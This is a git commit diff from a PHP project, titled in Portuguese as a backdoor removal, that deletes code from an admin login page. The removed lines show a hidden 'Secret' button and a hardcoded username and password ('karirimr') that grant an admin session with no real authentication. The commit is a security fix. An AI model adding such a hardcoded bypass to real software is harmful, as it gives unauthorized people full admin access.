4407489dae9f9ce80c030bc870b35816eea50e8b
wesleysousalacerda <wesleysousalacerda@gmail.com>
2017-04-04 19:20:09 -0300

    Remoção de backdoor

--- admin-mr/index.php
+++ admin-mr/index.php
@@ -41,16 +41,8 @@ if (filter_input(INPUT_POST, "btnEntrar", FILTER_SANITIZE_STRING)) {
         $retorno = "<div class=\"alert alert-danger\" role=\"alert\">Usuário ou senha inválido.</div>";
     }
     
-}else if(filter_input(INPUT_POST, "btnsecret", FILTER_SANITIZE_STRING)){
-$user = filter_input(INPUT_POST, "txtUsuario", FILTER_SANITIZE_STRING);
-$pass = filter_input(INPUT_POST, "txtSenha", FILTER_SANITIZE_STRING); 
-if ($user == "karirimr" & $pass == "karirimr"  ){
-        $_SESSION["cod"] = 1;
-        $_SESSION["nome"] = "Kariri Mr";
-        $_SESSION["logado"] = true;
-    header("Location: painel.php");
 }
-}
+
 ?>
 <!doctype html>
 <html lang="pt-br">
@@ -88,7 +80,7 @@ if ($user == "karirimr" & $pass == "karirimr"  ){
                             <input type="password" class="form-control" id="txtSenha" name="txtSenha" placeholder="*******">
                         </div>
                         <input class="btn btn-success" type="submit" name="btnEntrar" value="Entrar">
-                        <input class="btn btn-secret" type="submit" name="btnsecret" value="Secret">
+                        
                         <a href="#" data-toggle="modal" data-target="#myModal">Recuperar senha</a>
                         <br />
                         <label><input type="checkbox" value="s" name="ckManterLogado" /> Manter logado</label>  
